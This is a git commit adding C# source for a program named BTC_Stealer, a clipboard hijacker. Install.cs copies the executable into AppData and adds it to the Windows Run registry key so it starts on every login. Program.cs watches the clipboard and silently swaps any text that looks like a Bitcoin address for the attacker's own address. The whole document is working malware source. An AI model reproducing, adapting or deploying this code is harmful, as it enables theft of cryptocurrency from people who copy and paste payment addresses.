0290c13e1b1ea2803fd0e99d9f8e7ce768c7b046
szymboy1337 <52632120+szymboy1337@users.noreply.github.com>
2019-07-07 18:36:23 +0200

    Add files via upload

---
+++ Install.cs
@@ -0,0 +1,30 @@
+﻿using Microsoft.Win32;
+using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+namespace BTC_Stealer
+{
+    class Install
+    {
+        string file = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+        string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        string name = "btcsteler";
+
+        public void IsStartup()
+        {
+            // The path to the key where Windows looks for startup applications
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            if (rkApp.GetValue(name) == null)
+            {
+                File.Copy(file, appdata + "\\btc.exe");
+                rkApp.SetValue(name, appdata + "\\btc.exe");
+            }
+            else  return;
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+namespace BTC_Stealer
+{
+    static class Program
+    {
+
+        /// <summary>
+        /// Główny punkt wejścia dla aplikacji.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            Install ins = new Install();
+            ins.IsStartup();
+            string btcaddr = "ur btc addres";
+
+            while (true)
+            {
+            Thread.Sleep(100);
+                if(Clipboard.ContainsText())
+                {
+                    string clip = Clipboard.GetText();
+                    if(clip != btcaddr)
+                    {
+                        if(clip.StartsWith("1") || clip.StartsWith("3") || clip.StartsWith("bc1"))
+                        {
+                            if(clip.Length >=26 && clip.Length <=36)
+                            {
+                                Clipboard.SetText(btcaddr);
+                            }
+                        }
+                    }
+                }
+            }
+
+        }
+        
+    }
+}
